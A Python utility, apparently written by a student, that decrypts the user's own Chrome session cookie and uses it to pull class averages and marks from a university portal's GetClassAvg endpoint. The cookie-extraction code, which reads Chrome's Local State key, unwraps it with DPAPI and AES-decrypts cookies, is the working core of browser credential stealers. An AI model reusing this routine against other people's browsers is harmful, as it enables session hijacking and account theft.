import os
import json
import base64
import sqlite3
import shutil
from datetime import datetime, timedelta
import win32crypt
from Crypto.Cipher import AES

def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    if chromedate != 86400000000 and chromedate:
        try:
            return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
        except Exception as e:
            print(f"Error: {e}, chromedate: {chromedate}")
            return chromedate
    else:
        return ""


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    key = key[5:]

    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            return ""

def main():
    ascii_art = """
        @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&GY7G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@P5P&@@@@@@@@@@@#PJ7!?5G#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&. .#@@@@@@&B5?!7JPGG57:!@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&~Y@@@@@@@@&: .#@@@@B7!7YPGPJ!.  :!5@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&.J@&BB&@@@&: .#@@@@#GGP?^.  ^75B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@&:!J^~~^5@@&: .#@@@@P~. .~?P#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@&B: !G#G:^@@&: .#@@@@^  ~#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@##&@@@@@@@@@@?^^^~~~!J#@@&: .#@@@@#?: :?B@@@@@@@@@@@@@@@#####&@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@G7:  .^J&@@@@@@@@@@@@@@@@@@@&: .#@@@@@@&P!  ^Y#@@@@@@@@@@@&^    .:^!?5G&@@@@@@@@@@@@@@@@@@
@@@@@@@@@?  ^J57  :G@@@@@@@@@@@@@@@@@@&: .#@@@@@@@@@#Y^  !P@@@@@@@@@@P5555J7!^.  .^75#@#P?B@@@@@@@@@
@@@@@@@@P  ~@@@@B: .B@@@@@@@@BYY5@@@@@&: .#@@@@@@@@@@@@G!  ~G@@@@@@@@@@@@@@@@@&#GY!. .:. .B@@@@@@@@@
@@@@@@@@5  ~#@@@@J  7@@@@@@@@&~  ?@@@@&: .#@@@@@@@@@@@@@@P. :&@@@@@@@@@@@@@@@@@&B5!. .~JG&@@@@@@@@@@
@@@@@@@@@?.  ^!!~.  :&@@@@@@@@&:  P@@@@?  7&@@@@@@@@@@@@@#:  5@@@@@@@@@@@&BPJ7^. :~JG&@@@@@@@@@@@@@@
@@@@@@@@@@#Y7~^^!?. .#@@@@@@@@@J  ?@@@@@7  :7???????????~     ^???????7~^.  .~?5B&@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@G  ^@@@@@@@@@@?  Y@@@@@@G?~:...........^!YBP7~:......^~7YPB&@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@G:  P@@@@@@@@@5. :#@@@@@@@@@&&&&&&&&&&&&@@@@@@@&&&&&&&@@@@@@@@@@@@Y!7&@@@@@@@@@@@@@@
@@@@@@@@@@@@&B5!  .5@@@@@@&B5!  ^G@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@J!7&@@@@@@@@@@@@@@
@@@@@@@J~~~:.  .~Y#@@@B~~:.  .!5&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@57???J5B&@@@@@@#????5B&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
    """
    print(ascii_art)

    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    
    filename = "Cookies.db"
    if not os.path.isfile(filename):
        shutil.copyfile(db_path, filename)
    
    db = sqlite3.connect(filename)
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies WHERE host_key = 'flexstudent.nu.edu.pk'""")

    data = cursor.fetchall()
    if data:
        name = data[0][1]
        cookie = decrypt_data(data[0][-1], get_encryption_key())
    else:
        print("Bhai pehle chrome se login karo warna marks nahi milenge :P")
        exit()
    db.close()

    try:
        os.remove(filename)
    except:
        pass

    import http.client
    import json

    conn = http.client.HTTPSConnection("flexstudent.nu.edu.pk")

    headersList = {
    "Accept": "*/*",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
    "Cookie": f"{name}={cookie};",
    "Content-Type": "application/json" 
    }

    Courses = {
        "Cryptography": 1896,
        "Information Security": 1472,
        "Computer Networks": 1470,
        "Design and Analysis of Algorithms": 1496,
        "Database Systems": 1463,
        "Computer Networks - Lab": 1471,
        "Database Systems - Lab": 1464
    }

    for course in Courses:    
        payload = json.dumps({
            "CourseId": Courses[course],
            "SemID": "20223"
            })

        conn.request("POST", "/Student/GetClassAvg", payload, headersList)
        response = conn.getresponse()
        result = response.read()

        try:
            res = json.loads(result.decode("utf-8"))
            res = res[0]
            print(f"""
                Course: {course}
                Standard Deviation: {res['CLASS_STD']}
                Average: {res['CLASS_AVG']}
                Minimum: {res['CLASS_MIN']}
                Maximum: {res['CLASS_MAX']}
                Total Marks: 100
                Obtained Marks: {res['TOT_WEIGHT']}
                ===============================================================""")
        except:
            print(f"""
                No record found for {course}
                ===============================================================""")

if __name__ == "__main__":
    main()